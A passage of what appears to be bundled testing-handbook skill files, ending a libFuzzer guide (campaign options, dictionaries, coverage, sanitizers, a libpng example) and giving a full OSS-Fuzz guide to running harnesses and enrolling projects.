automatically minimizes corpus entries during fuzzing. To explicitly minimize:\n\n```bash\nmkdir minimized_corpus/\n./fuzz -merge=1 minimized_corpus/ corpus/\n```\n\nThis creates a deduplicated, minimized corpus in `minimized_corpus/`.\n\n> **See Also:** For corpus creation strategies, seed selection, format-specific corpus building,\n> and corpus maintenance, see the **fuzzing-corpus** technique skill.\n\n## Running Campaigns\n\n### Basic Run\n\n```bash\n./fuzz corpus/\n```\n\nThis runs until a crash is found or you stop it (Ctrl+C).\n\n### Recommended: Continue After Crashes\n\n```bash\n./fuzz -fork=1 -ignore_crashes=1 corpus/\n```\n\nThe `-fork` and `-ignore_crashes` flags (experimental but widely used) allow fuzzing to continue after finding crashes.\n\n### Common Options\n\n**Control input size:**\n```bash\n./fuzz -max_len=4000 corpus/\n```\nRule of thumb: 2x the size of minimal realistic input.\n\n**Set timeout:**\n```bash\n./fuzz -timeout=2 corpus/\n```\nAbort test cases that run longer than 2 seconds.\n\n**Use a dictionary:**\n```bash\n./fuzz -dict=./format.dict corpus/\n```\n\n**Close stdout/stderr (speed up fuzzing):**\n```bash\n./fuzz -close_fd_mask=3 corpus/\n```\n\n**See all options:**\n```bash\n./fuzz -help=1\n```\n\n### Multi-Core Fuzzing\n\n**Option 1: Jobs and workers (recommended):**\n```bash\n./fuzz -jobs=4 -workers=4 -fork=1 -ignore_crashes=1 corpus/\n```\n- `-jobs=4`: Run 4 sequential campaigns\n- `-workers=4`: Process jobs in parallel with 4 processes\n- Test cases are shared between jobs\n\n**Option 2: Fork mode:**\n```bash\n./fuzz -fork=4 -ignore_crashes=1 corpus/\n```\n\n**Note:** For serious multi-core fuzzing, consider switching to AFL++, Honggfuzz, or LibAFL.\n\n### Re-executing Test Cases\n\n**Re-run a single crash:**\n```bash\n./fuzz ./crash-a9993e364706816aba3e25717850c26c9cd0d89d\n```\n\n**Test all inputs in a directory without fuzzing:**\n```bash\n./fuzz -runs=0 corpus/\n```\n\n### Interpreting Output\n\nWhen fuzzing runs, you'll see statistics like:\n\n```\nINFO: Seed: 3517090860\nINFO: Loaded 1 modules (9 inline 8-bit counters)\n#2      INITED cov: 3 ft: 4 corp: 1/1b exec/s: 0 rss: 26Mb\n#57     NEW    cov: 4 ft: 5 corp: 2/4b lim: 4 exec/s: 0 rss: 26Mb\n```\n\n| Output | Meaning |\n|--------|---------|\n| `INITED` | Fuzzing initialized |\n| `NEW` | New coverage found, added to corpus |\n| `REDUCE` | Input minimized while keeping coverage |\n| `cov: N` | Number of coverage edges hit |\n| `corp: X/Yb` | Corpus size: X entries, Y total bytes |\n| `exec/s: N` | Executions per second |\n| `rss: NMb` | Resident memory usage |\n\n**On crash:**\n```\n==11672== ERROR: libFuzzer: deadly signal\nartifact_prefix='./'; Test unit written to ./crash-a9993e364706816aba3e25717850c26c9cd0d89d\n0x61,0x62,0x63,\nabc\nBase64: YWJj\n```\n\nThe crash is saved to `./crash-<hash>` with the input shown in hex, UTF-8, and Base64.\n\n**Reproducibility:** Use `-seed=<value>` to reproduce a fuzzing campaign (single-core only).\n\n## Fuzzing Dictionary\n\nDictionaries help the fuzzer discover interesting inputs faster by providing hints about the input format.\n\n### Dictionary Format\n\nCreate a text file with quoted strings (one per line):\n\n```conf\n# Lines starting with '#' are comments\n\n# Magic bytes\nmagic=\"\\x89PNG\"\nmagic2=\"IEND\"\n\n# Keywords\n\"GET\"\n\"POST\"\n\"Content-Type\"\n\n# Hex sequences\ndelimiter=\"\\xFF\\xD8\\xFF\"\n```\n\n### Using a Dictionary\n\n```bash\n./fuzz -dict=./format.dict corpus/\n```\n\n### Generating a Dictionary\n\n**From header files:**\n```bash\ngrep -o '\".*\"' header.h > header.dict\n```\n\n**From man pages:**\n```bash\nman curl | grep -oP '^\\s*(--|-)\\K\\S+' | sed 's/[,.]$//' | sed 's/^/\"&/; s/$/&\"/' | sort -u > man.dict\n```\n\n**From binary strings:**\n```bash\nstrings ./binary | sed 's/^/\"&/; s/$/&\"/' > strings.dict\n```\n\n**Using LLMs:** Ask ChatGPT or similar to generate a dictionary for your format (e.g., \"Generate a libFuzzer dictionary for a JSON parser\").\n\n> **See Also:** For advanced dictionary generation, format-specific dictionaries, and\n> dictionary optimization strategies, see the **fuzzing-dictionaries** technique skill.\n\n## Coverage Analysis\n\nWhile libFuzzer shows basic coverage stats (`cov: N`), detailed coverage analysis requires additional tools.\n\n### Source-Based Coverage\n\n**1. Recompile with coverage instrumentation:**\n```bash\nclang++ -fsanitize=fuzzer -fprofile-instr-generate -fcoverage-mapping harness.cc target.cc -o fuzz\n```\n\n**2. Run fuzzer to collect coverage:**\n```bash\nLLVM_PROFILE_FILE=\"coverage-%p.profraw\" ./fuzz -runs=10000 corpus/\n```\n\n**3. Merge coverage data:**\n```bash\nllvm-profdata merge -sparse coverage-*.profraw -o coverage.profdata\n```\n\n**4. Generate coverage report:**\n```bash\nllvm-cov show ./fuzz -instr-profile=coverage.profdata\n```\n\n**5. Generate HTML report:**\n```bash\nllvm-cov show ./fuzz -instr-profile=coverage.profdata -format=html > coverage.html\n```\n\n### Improving Coverage\n\n**Tips:**\n- Provide better seed inputs in corpus\n- Use dictionaries for format-aware fuzzing\n- Check if harness properly exercises target\n- Consider structure-aware fuzzing for complex formats\n- Run longer campaigns (days/weeks)\n\n> **See Also:** For detailed coverage analysis techniques, identifying coverage gaps,\n> systematic coverage improvement, and comparing coverage across fuzzers, see the\n> **coverage-analysis** technique skill.\n\n## Sanitizer Integration\n\n### AddressSanitizer (ASan)\n\nASan detects memory errors like buffer overflows and use-after-free bugs. **Highly recommended for fuzzing.**\n\n**Enable ASan:**\n```bash\nclang++ -fsanitize=fuzzer,address -g -O2 -U_FORTIFY_SOURCE harness.cc target.cc -o fuzz\n```\n\n**Example ASan output:**\n```\n==1276163==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6020000c4ab1\nWRITE of size 1 at 0x6020000c4ab1 thread T0\n    #0 0x55555568631a in check_buf(char*, unsigned long) main.cc:13:25\n    #1 0x5555556860bf in LLVMFuzzerTestOneInput harness.cc:7:3\n```\n\n**Configure ASan with environment variables:**\n```bash\nASAN_OPTIONS=verbosity=1:abort_on_error=1 ./fuzz corpus/\n```\n\n**Important flags:**\n- `verbosity=1`: Show ASan is active\n- `detect_leaks=0`: Disable leak detection (leaks reported at end)\n- `abort_on_error=1`: Call `abort()` instead of `_exit()` on errors\n\n**Drawbacks:**\n- 2-4x slowdown\n- Requires ~20TB virtual memory (disable memory limits: `-rss_limit_mb=0`)\n- Best supported on Linux\n\n> **See Also:** For comprehensive ASan configuration, common pitfalls, symbolization,\n> and combining with other sanitizers, see the **address-sanitizer** technique skill.\n\n### UndefinedBehaviorSanitizer (UBSan)\n\nUBSan detects undefined behavior like integer overflow, null pointer dereference, etc.\n\n**Enable UBSan:**\n```bash\nclang++ -fsanitize=fuzzer,undefined -g -O2 harness.cc target.cc -o fuzz\n```\n\n**Combine with ASan:**\n```bash\nclang++ -fsanitize=fuzzer,address,undefined -g -O2 harness.cc target.cc -o fuzz\n```\n\n### MemorySanitizer (MSan)\n\nMSan detects uninitialized memory reads. More complex to use (requires rebuilding all dependencies).\n\n```bash\nclang++ -fsanitize=fuzzer,memory -g -O2 harness.cc target.cc -o fuzz\n```\n\n### Common Sanitizer Issues\n\n| Issue | Solution |\n|-------|----------|\n| ASan slows fuzzing too much | Use `-fsanitize-recover=address` for non-fatal errors |\n| Out of memory | Set `ASAN_OPTIONS=rss_limit_mb=0` or `-rss_limit_mb=0` |\n| Stack exhaustion | Increase stack size: `ASAN_OPTIONS=stack_size=8388608` |\n| False positives with `_FORTIFY_SOURCE` | Use `-U_FORTIFY_SOURCE` flag |\n| MSan reports in dependencies | Rebuild all dependencies with `-fsanitize=memory` |\n\n## Real-World Examples\n\n### Example 1: Fuzzing libpng\n\nlibpng is a widely-used library for reading/writing PNG images. Bugs can lead to security issues.\n\n**1. Get source code:**\n```bash\ncurl -L -O https://downloads.sourceforge.net/project/libpng/libpng16/1.6.37/libpng-1.6.37.tar.xz\ntar xf libpng-1.6.37.tar.xz\ncd libpng-1.6.37/\n```\n\n**2. Install dependencies:**\n```bash\napt install zlib1g-dev\n```\n\n**3. Compile with fuzzing instrumentation:**\n```bash\nexport CC=clang CFLAGS=\"-fsanitize=fuzzer-no-link -fsanitize=address\"\nexport CXX=clang++ CXXFLAGS=\"$CFLAGS\"\n./configure --enable-shared=no\nmake\n```\n\n**4. Get a harness (or write your own):**\n```bash\ncurl -O https://raw.githubusercontent.com/glennrp/libpng/f8e5fa92b0e37ab597616f554bee254157998227/contrib/oss-fuzz/libpng_read_fuzzer.cc\n```\n\n**5. Prepare corpus and dictionary:**\n```bash\nmkdir corpus/\ncurl -o corpus/input.png https://raw.githubusercontent.com/glennrp/libpng/acfd50ae0ba3198ad734e5d4dec2b05341e50924/contrib/pngsuite/iftp1n3p08.png\ncurl -O https://raw.githubusercontent.com/glennrp/libpng/2fff013a6935967960a5ae626fc21432807933dd/contrib/oss-fuzz/png.dict\n```\n\n**6. Link and compile fuzzer:**\n```bash\nclang++ -fsanitize=fuzzer -fsanitize=address libpng_read_fuzzer.cc .libs/libpng16.a -lz -o fuzz\n```\n\n**7. Run fuzzing campaign:**\n```bash\n./fuzz -close_fd_mask=3 -dict=./png.dict corpus/\n```\n\n### Example 2: Simple Division Bug\n\nHarness that finds a division-by-zero bug:\n\n```c++\n#include <stdint.h>\n#include <stddef.h>\n\ndouble divide(uint32_t numerator, uint32_t denominator) {\n    // Bug: No check if denominator is zero\n    return numerator / denominator;\n}\n\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    if(size != 2 * sizeof(uint32_t)) {\n        return 0;\n    }\n\n    uint32_t numerator = *(uint32_t*)(data);\n    uint32_t denominator = *(uint32_t*)(data + sizeof(uint32_t));\n\n    divide(numerator, denominator);\n\n    return 0;\n}\n```\n\nCompile and fuzz:\n```bash\nclang++ -fsanitize=fuzzer harness.cc -o fuzz\n./fuzz\n```\n\nThe fuzzer will quickly find inputs causing a crash.\n\n## Advanced Usage\n\n### Tips and Tricks\n\n| Tip | Why It Helps |\n|-----|--------------|\n| Start with single-core, switch to AFL++ for multi-core | libFuzzer harnesses work with AFL++ |\n| Use dictionaries for structured formats | 10-100x faster bug discovery |\n| Close file descriptors with `-close_fd_mask=3` | Speed boost if SUT writes output |\n| Set reasonable `-max_len` | Prevents wasted time on huge inputs |\n| Run for days/weeks, not minutes | Coverage plateaus take time to break |\n| Use seed corpus from test suites | Starts fuzzing from valid inputs |\n\n### Structure-Aware Fuzzing\n\nFor highly structured inputs (e.g., complex protocols, file formats), use libprotobuf-mutator:\n\n- Define input structure using Protocol Buffers\n- libFuzzer mutates protobuf messages (structure-preserving mutations)\n- Harness converts protobuf to native format\n\nSee [structure-aware fuzzing documentation](https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md) for details.\n\n### Custom Mutators\n\nlibFuzzer allows custom mutators for specialized fuzzing:\n\n```c++\nextern \"C\" size_t LLVMFuzzerCustomMutator(uint8_t *Data, size_t Size,\n                                          size_t MaxSize, unsigned int Seed) {\n    // Custom mutation logic\n    return new_size;\n}\n\nextern \"C\" size_t LLVMFuzzerCustomCrossOver(const uint8_t *Data1, size_t Size1,\n                                            const uint8_t *Data2, size_t Size2,\n                                            uint8_t *Out, size_t MaxOutSize,\n                                            unsigned int Seed) {\n    // Custom crossover logic\n    return new_size;\n}\n```\n\n### Performance Tuning\n\n| Setting | Impact |\n|---------|--------|\n| `-close_fd_mask=3` | Closes stdout/stderr, speeds up fuzzing |\n| `-max_len=<reasonable_size>` | Avoids wasting time on huge inputs |\n| `-timeout=<seconds>` | Detects hangs, prevents stuck executions |\n| Disable ASan for baseline | 2-4x speed boost (but misses memory bugs) |\n| Use `-jobs` and `-workers` | Limited multi-core support |\n| Run on Linux | Best platform support and performance |\n\n## Troubleshooting\n\n| Problem | Cause | Solution |\n|---------|-------|----------|\n| No crashes found after hours | Poor corpus, low coverage | Add seed inputs, use dictionary, check harness |\n| Very slow executions/sec (<100) | Target too complex, excessive logging | Optimize target, use `-close_fd_mask=3`, reduce logging |\n| Out of memory | ASan's 20TB virtual memory | Set `-rss_limit_mb=0` to disable RSS limit |\n| Fuzzer stops after first crash | Default behavior | Use `-fork=1 -ignore_crashes=1` to continue |\n| Can't reproduce crash | Non-determinism in harness/target | Remove random number generation, global state |\n| Linking errors with `-fsanitize=fuzzer` | Missing libFuzzer runtime | Ensure using Clang, check LLVM installation |\n| GCC project won't compile with Clang | GCC-specific code | Switch to AFL++ with `gcc_plugin` instead |\n| Coverage not improving | Corpus plateau | Run longer, add dictionary, improve seeds, check coverage report |\n| Crashes but ASan doesn't trigger | Memory error not detected without ASan | Recompile with `-fsanitize=address` |\n\n## Related Skills\n\n### Technique Skills\n\n| Skill | Use Case |\n|-------|----------|\n| **fuzz-harness-writing** | Detailed guidance on writing effective harnesses, structure-aware fuzzing, and FuzzedDataProvider usage |\n| **address-sanitizer** | Memory error detection configuration, ASAN_OPTIONS, and troubleshooting |\n| **undefined-behavior-sanitizer** | Detecting undefined behavior during fuzzing |\n| **coverage-analysis** | Measuring fuzzing effectiveness and identifying untested code paths |\n| **fuzzing-corpus** | Building and managing seed corpora, corpus minimization strategies |\n| **fuzzing-dictionaries** | Creating format-specific dictionaries for faster bug discovery |\n\n### Related Fuzzers\n\n| Skill | When to Consider |\n|-------|------------------|\n| **aflpp** | When you need serious multi-core fuzzing, or when libFuzzer coverage plateaus |\n| **honggfuzz** | When you want hardware-based coverage feedback on Linux |\n| **libafl** | When building custom fuzzers or conducting fuzzing research |\n\n## Resources\n\n### Official Documentation\n\n- [LLVM libFuzzer Documentation](https://llvm.org/docs/LibFuzzer.html) - Official reference\n- [libFuzzer Tutorial by Google](https://github.com/google/fuzzing/blob/master/tutorial/libFuzzerTutorial.md) - Step-by-step guide\n- [SanitizerCoverage](https://clang.llvm.org/docs/SanitizerCoverage.html) - Coverage instrumentation details\n\n### Advanced Topics\n\n- [Structure-Aware Fuzzing with libprotobuf-mutator](https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md)\n- [Split Inputs in libFuzzer](https://github.com/google/fuzzing/blob/master/docs/split-inputs.md)\n- [FuzzedDataProvider Header](https://github.com/llvm/llvm-project/blob/main/compiler-rt/include/fuzzer/FuzzedDataProvider.h)\n\n### Example Projects\n\n- [OSS-Fuzz](https://github.com/google/oss-fuzz) - Continuous fuzzing for open-source projects (many libFuzzer examples)\n- [AFL++ Dictionary Collection](https://github.com/AFLplusplus/AFLplusplus/tree/stable/dictionaries) - Reusable dictionaries\n",
        "plugins/testing-handbook-skills/skills/ossfuzz/SKILL.md": "---\nname: ossfuzz\ntype: technique\ndescription: >\n  OSS-Fuzz provides free continuous fuzzing for open source projects.\n  Use when setting up continuous fuzzing infrastructure or enrolling projects.\n---\n\n# OSS-Fuzz\n\n[OSS-Fuzz](https://google.github.io/oss-fuzz/) is an open-source project developed by Google that provides free distributed infrastructure for continuous fuzz testing. It streamlines the fuzzing process and facilitates simpler modifications. While only select projects are accepted into OSS-Fuzz, the project's core is open-source, allowing anyone to host their own instance for private projects.\n\n## Overview\n\nOSS-Fuzz provides a simple CLI framework for building and starting harnesses or calculating their coverage. Additionally, OSS-Fuzz can be used as a service that hosts static web pages generated from fuzzing outputs such as coverage information.\n\n### Key Concepts\n\n| Concept | Description |\n|---------|-------------|\n| **helper.py** | CLI script for building images, building fuzzers, and running harnesses locally |\n| **Base Images** | Hierarchical Docker images providing build dependencies and compilers |\n| **project.yaml** | Configuration file defining project metadata for OSS-Fuzz enrollment |\n| **Dockerfile** | Project-specific image with build dependencies |\n| **build.sh** | Script that builds fuzzing harnesses for your project |\n| **Criticality Score** | Metric used by OSS-Fuzz team to evaluate project acceptance |\n\n## When to Apply\n\n**Apply this technique when:**\n- Setting up continuous fuzzing for an open-source project\n- Need distributed fuzzing infrastructure without managing servers\n- Want coverage reports and bug tracking integrated with fuzzing\n- Testing existing OSS-Fuzz harnesses locally\n- Reproducing crashes from OSS-Fuzz bug reports\n\n**Skip this technique when:**\n- Project is closed-source (unless hosting your own OSS-Fuzz instance)\n- Project doesn't meet OSS-Fuzz's criticality score threshold\n- Need proprietary or specialized fuzzing infrastructure\n- Fuzzing simple scripts that don't warrant infrastructure\n\n## Quick Reference\n\n| Task | Command |\n|------|---------|\n| Clone OSS-Fuzz | `git clone https://github.com/google/oss-fuzz` |\n| Build project image | `python3 infra/helper.py build_image --pull <project>` |\n| Build fuzzers with ASan | `python3 infra/helper.py build_fuzzers --sanitizer=address <project>` |\n| Run specific harness | `python3 infra/helper.py run_fuzzer <project> <harness>` |\n| Generate coverage report | `python3 infra/helper.py coverage <project>` |\n| Check helper.py options | `python3 infra/helper.py --help` |\n\n## OSS-Fuzz Project Components\n\nOSS-Fuzz provides several publicly available tools and web interfaces:\n\n### Bug Tracker\n\nThe [bug tracker](https://issues.oss-fuzz.com/issues?q=status:open) allows you to:\n- Check bugs from specific projects (initially visible only to maintainers, later [made public](https://google.github.io/oss-fuzz/getting-started/bug-disclosure-guidelines/))\n- Create new issues and comment on existing ones\n- Search for similar bugs across **all projects** to understand issues\n\n### Build Status System\n\nThe [build status system](https://oss-fuzz-build-logs.storage.googleapis.com/index.html) helps track:\n- Build statuses of all included projects\n- Date of last successful build\n- Build failures and their duration\n\n### Fuzz Introspector\n\n[Fuzz Introspector](https://oss-fuzz-introspector.storage.googleapis.com/index.html) displays:\n- Coverage data for projects enrolled in OSS-Fuzz\n- Hit frequency for covered code\n- Performance analysis and blocker identification\n\nRead [this case study](https://github.com/ossf/fuzz-introspector/blob/main/doc/CaseStudies.md) for examples and explanations.\n\n## Step-by-Step: Running a Single Harness\n\nYou don't need to host the whole OSS-Fuzz platform to use it. The helper script makes it easy to run individual harnesses locally.\n\n### Step 1: Clone OSS-Fuzz\n\n```bash\ngit clone https://github.com/google/oss-fuzz\ncd oss-fuzz\npython3 infra/helper.py --help\n```\n\n### Step 2: Build Project Image\n\n```bash\npython3 infra/helper.py build_image --pull <project-name>\n```\n\nThis downloads and builds the base Docker image for the project.\n\n### Step 3: Build Fuzzers with Sanitizers\n\n```bash\npython3 infra/helper.py build_fuzzers --sanitizer=address <project-name>\n```\n\n**Sanitizer options:**\n- `--sanitizer=address` for [AddressSanitizer](https://appsec.guide/docs/fuzzing/techniques/asan/) with [LeakSanitizer](https://github.com/google/sanitizers/wiki/AddressSanitizerLeakSanitizer)\n- Other sanitizers available (language support varies)\n\n**Note:** Fuzzers are built to `/build/out/<project-name>/` containing the harness executables, dictionaries, corpus, and crash files.\n\n### Step 4: Run the Fuzzer\n\n```bash\npython3 infra/helper.py run_fuzzer <project-name> <harness-name> [<fuzzer-args>]\n```\n\nThe helper script automatically runs any missed steps if you skip them.\n\n### Step 5: Coverage Analysis (Optional)\n\nFirst, [install gsutil](https://cloud.google.com/storage/docs/gsutil_install) (skip gcloud initialization).\n\n```bash\npython3 infra/helper.py build_fuzzers --sanitizer=coverage <project-name>\npython3 infra/helper.py coverage <project-name>\n```\n\nUse `--no-corpus-download` to use only local corpus. The command generates and hosts a coverage report locally.\n\nSee [official OSS-Fuzz documentation](https://google.github.io/oss-fuzz/advanced-topics/code-coverage/) for details.\n\n## Common Patterns\n\n### Pattern: Running irssi Example\n\n**Use Case:** Testing OSS-Fuzz setup with a simple enrolled project\n\n```bash\n# Clone and navigate to OSS-Fuzz\ngit clone https://github.com/google/oss-fuzz\ncd oss-fuzz\n\n# Build and run irssi fuzzer\npython3 infra/helper.py build_image --pull irssi\npython3 infra/helper.py build_fuzzers --sanitizer=address irssi\npython3 infra/helper.py run_fuzzer irssi irssi-fuzz\n```\n\n**Expected Output:**\n```\nINFO:__main__:Running: docker run --rm --privileged --shm-size=2g --platform linux/amd64 -i -e FUZZING_ENGINE=libfuzzer -e SANITIZER=address -e RUN_FUZZER_MODE=interactive -e HELPER=True -v /private/tmp/oss-fuzz/build/out/irssi:/out -t gcr.io/oss-fuzz-base/base-runner run_fuzzer irssi-fuzz.\nUsing seed corpus: irssi-fuzz_seed_corpus.zip\n/out/irssi-fuzz -rss_limit_mb=2560 -timeout=25 /tmp/irssi-fuzz_corpus -max_len=2048 < /dev/null\nINFO: Running with entropic power schedule (0xFF, 100).\nINFO: Seed: 1531341664\nINFO: Loaded 1 modules   (95687 inline 8-bit counters): 95687 [0x1096c80, 0x10ae247),\nINFO: Loaded 1 PC tables (95687 PCs): 95687 [0x10ae248,0x1223eb8),\nINFO:      719 files found in /tmp/irssi-fuzz_corpus\nINFO: seed corpus: files: 719 min: 1b max: 170106b total: 367969b rss: 48Mb\n#720        INITED cov: 409 ft: 1738 corp: 640/163Kb exec/s: 0 rss: 62Mb\n#762        REDUCE cov: 409 ft: 1738 corp: 640/163Kb lim: 2048 exec/s: 0 rss: 63Mb L: 236/2048 MS: 2 ShuffleBytes-EraseBytes-\n```\n\n### Pattern: Enrolling a New Project\n\n**Use Case:** Adding your project to OSS-Fuzz (or private instance)\n\nCreate three files in `projects/<your-project>/`:\n\n**1. project.yaml** - Project metadata:\n```yaml\nhomepage: \"https://github.com/yourorg/yourproject\"\nlanguage: c++\nprimary_contact: \"your-email@example.com\"\nmain_repo: \"https://github.com/yourorg/yourproject\"\nfuzzing_engines:\n  - libfuzzer\nsanitizers:\n  - address\n  - undefined\n```\n\n**2. Dockerfile** - Build dependencies:\n```dockerfile\nFROM gcr.io/oss-fuzz-base/base-builder\nRUN apt-get update && apt-get install -y \\\n    autoconf \\\n    automake \\\n    libtool \\\n    pkg-config\nRUN git clone --depth 1 https://github.com/yourorg/yourproject\nWORKDIR yourproject\nCOPY build.sh $SRC/\n```\n\n**3. build.sh** - Build harnesses:\n```bash\n#!/bin/bash -eu\n./autogen.sh\n./configure --disable-shared\nmake -j$(nproc)\n\n# Build harnesses\n$CXX $CXXFLAGS -std=c++11 -I. \\\n    $SRC/yourproject/fuzz/harness.cc -o $OUT/harness \\\n    $LIB_FUZZING_ENGINE ./libyourproject.a\n\n# Copy corpus and dictionary if available\ncp $SRC/yourproject/fuzz/corpus.zip $OUT/harness_seed_corpus.zip\ncp $SRC/yourproject/fuzz/dictionary.dict $OUT/harness.dict\n```\n\n## Docker Images in OSS-Fuzz\n\nHarnesses are built and executed in Docker containers. All projects share a runner image, but each project has its own build image.\n\n### Image Hierarchy\n\nImages build on each other in this sequence:\n\n1. **[base_image](https://github.com/google/oss-fuzz/blob/master/infra/base-images/base-image/Dockerfile)** - Specific Ubuntu version\n2. **[base_clang](https://github.com/google/oss-fuzz/tree/master/infra/base-images/base-clang)** - Clang compiler; based on `base_image`\n3. **[base_builder](https://github.com/google/oss-fuzz/tree/master/infra/base-images/base-builder)** - Build dependencies; based on `base_clang`\n   - Language-specific variants: [`base_builder_go`](https://github.com/google/oss-fuzz/tree/master/infra/base-images/base-builder-go), etc.\n   - See [/oss-fuzz/infra/base-images/](https://github.com/google/oss-fuzz/tree/master/infra/base-images) for full list\n4. **Your project Docker image** - Project-specific dependencies; based on `base_builder` or language variant\n\n### Runner Images (Used Separately)\n\n- **[base_runner](https://github.com/google/oss-fuzz/tree/master/infra/base-images/base-runner)** - Executes harnesses; based on `base_clang`\n- **[base_runner_debug](https://github.com/google/oss-fuzz/tree/master/infra/base-images/base-runner-debug)** - With debug tools; based on `base_runner`\n\n## Advanced Usage\n\n### Tips and Tricks\n\n| Tip | Why It Helps |\n|-----|--------------|\n| **Don't manually copy source code** | Project Dockerfile likely already pulls latest version |\n| **Check existing projects** | Browse [oss-fuzz/projects](https://github.com/google/oss-fuzz/tree/master/projects) for examples |\n| **Keep harnesses in separate repo** | Like [curl-fuzzer](https://github.com/curl/curl-fuzzer) - cleaner organization |\n| **Use specific compiler versions** | Base images provide consistent build environment |\n| **Install dependencies in Dockerfile** | May require approval for OSS-Fuzz enrollment |\n\n### Criticality Score\n\nOSS-Fuzz uses a [criticality score](https://github.com/ossf/criticality_score) to evaluate project acceptance. See [this example](https://github.com/google/oss-fuzz/pull/11444#issuecomment-1875907472) for how scoring works.\n\nProjects with lower scores may still be added to private OSS-Fuzz instances.\n\n### Hosting Your Own Instance\n\nSince OSS-Fuzz is open-source, you can host your own instance for:\n- Private projects not eligible for public OSS-Fuzz\n- Projects with lower criticality scores\n- Custom fuzzing infrastructure needs\n\n## Anti-Patterns\n\n| Anti-Pattern | Problem | Correct Approach |\n|--------------|---------|------------------|\n| **Manually pulling source in build.sh** | Doesn't use latest version | Let Dockerfile handle git clone |\n| **Copying code to OSS-Fuzz repo** | Hard to maintain, violates separation | Reference external harness repo |\n| **Ignoring base image versions** | Build inconsistencies | Use provided base images and compilers |\n| **Skipping local testing** | Wastes CI resources | Use helper.py locally before PR |\n| **Not checking build status** | Unnoticed build failures | Monitor build status page regularly |\n\n## Tool-Specific Guidance\n\n### libFuzzer\n\nOSS-Fuzz primarily uses libFuzzer as the fuzzing engine for C/C++ projects.\n\n**Harness signature:**\n```c++\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    // Your fuzzing logic\n    return 0;\n}\n```\n\n**Build in build.sh:**\n```bash\n$CXX $CXXFLAGS -std=c++11 -I. \\\n    harness.cc -o $OUT/harness \\\n    $LIB_FUZZING_ENGINE ./libproject.a\n```\n\n**Integration tips:**\n- Use `$LIB_FUZZING_ENGINE` variable provided by OSS-Fuzz\n- Include `-fsanitize=fuzzer` is handled automatically\n- Link against static libraries when possible\n\n### AFL++\n\nOSS-Fuzz supports AFL++ as an alternative fuzzing engine.\n\n**Enable in project.yaml:**\n```yaml\nfuzzing_engines:\n  - afl\n  - libfuzzer\n```\n\n**Integration tips:**\n- AFL++ harnesses work alongside libFuzzer harnesses\n- Use persistent mode for better performance\n- OSS-Fuzz handles engine-specific compilation flags\n\n### Atheris (Python)\n\nFor Python projects with C extensions.\n\n**Example from [cbor2 integration](https://github.com/google/oss-fuzz/pull/11444):**\n\n**Harness:**\n```python\nimport atheris\nimport sys\nimport cbor2\n\n@atheris.instrument_func\ndef TestOneInput(data):\n    fdp = atheris.FuzzedDataProvider(data)\n    try:\n        cbor2.loads(data)\n    except (cbor2.CBORDecodeError, ValueError):\n        pass\n\ndef main():\n    atheris.Setup(sys.argv, TestOneInput)\n    atheris.Fuzz()\n\nif __name__ == \"__main__\":\n    main()\n```\n\n**Build in build.sh:**\n```bash\npip3 install .\nfor fuzzer in $(find $SRC -name 'fuzz_*.py'); do\n  compile_python_fuzzer $fuzzer\ndone\n```\n\n**Integration tips:**\n- Use `compile_python_fuzzer` helper provided by OSS-Fuzz\n- See [Continuously Fuzzing Python C Extensions](https://blog.trailofbits.com/2024/02/23/continuously-fuzzing-python-c-extensions/) blog post\n\n### Rust Projects\n\n**Enable in project.yaml:**\n```yaml\nlanguage: rust\nfuzzing_engines:\n  - libfuzzer\nsanitizers:\n  - address  # Only AddressSanitizer supported for Rust\n```\n\n**Build in build.sh:**\n```bash\ncargo fuzz build -O --debug-assertions\ncp fuzz/target/x86_64-unknown-linux-gnu/release/fuzz_target_1 $OUT/\n```\n\n**Integration tips:**\n- [Rust supports only AddressSanitizer with libfuzzer](https://google.github.io/oss-fuzz/getting-started/new-project-guide/rust-lang/#projectyaml)\n- Use cargo-fuzz for local development\n- OSS-Fuzz handles Rust-specific compilation\n\n## Troubleshooting\n\n| Issue | Cause | Solution |\n|-------|-------|----------|\n| **Build fails with missing dependencies** | Dependencies not in Dockerfile | Add `apt-get install` or equivalent in Dockerfile |\n| **Harness crashes immediately** | Missing input validation | Add size checks in harness |\n| **Coverage is 0%** | Harness not reaching target code | Verify harness actually calls target functions |\n| **Build timeout** | Complex build process | Optimize build.sh, consider parallel builds |\n| **Sanitizer errors in build** | Incompatible flags | Use flags provided by OSS-Fuzz environment variables |\n| **Cannot find source code** | Wrong working directory in Dockerfile | Set WORKDIR or use absolute paths |\n\n## Related Skills\n\n### Tools That Use This Technique\n\n| Skill | How It Applies |\n|-------|----------------|\n| **libfuzzer** | Primary fuzzing engine used by OSS-Fuzz |\n| **aflpp** | Alternative fuzzing engine supported by OSS-Fuzz |\n| **atheris** | Used for fuzzing Python projects in OSS-Fuzz |\n| **cargo-fuzz** | Used for Rust projects in OSS-Fuzz |\n\n### Related Techniques\n\n| Skill | Relationship |\n|-------|--------------|\n| **coverage-analysis** | OSS-Fuzz generates coverage reports via helper.py |\n| **address-sanitizer** | Default sanitizer for OSS-Fuzz projects |\n| **fuzz-harness-writing** | Essential for enrolling projects in OSS-Fuzz |\n| **corpus-management** | OSS-Fuzz maintains corpus for enrolled projects |\n\n## Resources\n\n### Key External Resources\n\n**[OSS-Fuzz Official Documentation](https://google.github.io/oss-fuzz/)**\nComprehensive documentation covering enrollment, harness writing, and troubleshooting for the OSS-Fuzz platform.\n\n**[Getting Started Guide](https://google.github.io/oss-fuzz/getting-started/accepting-new-projects/)**\nStep-by-step process for enrolling new projects into OSS-Fuzz, including requirements and approval process.\n\n**[cbor2 OSS-Fuzz Integration PR](https://github.com/google/oss-fuzz/pull/11444)**\nReal-world example of enrolling a Python project with C extensions into OSS-Fuzz. Shows:\n- Initial proposal and project introduction\n- Criticality score evaluation\n- Complete implementation (project.yaml, Dockerfile, build.sh, harnesses)\n\n**[Fuzz Introspector Case Studies](https://github.com/ossf/fuzz-introspector/blob/main/doc/CaseStudies.md)**\nExamples and explanations of using Fuzz Introspector to analyze coverage and identify fuzzing blockers.\n\n### Video Resources\n\nCheck OSS-Fuzz documentation for workshop recordings and tutorials on enrollment and harness development.\n",
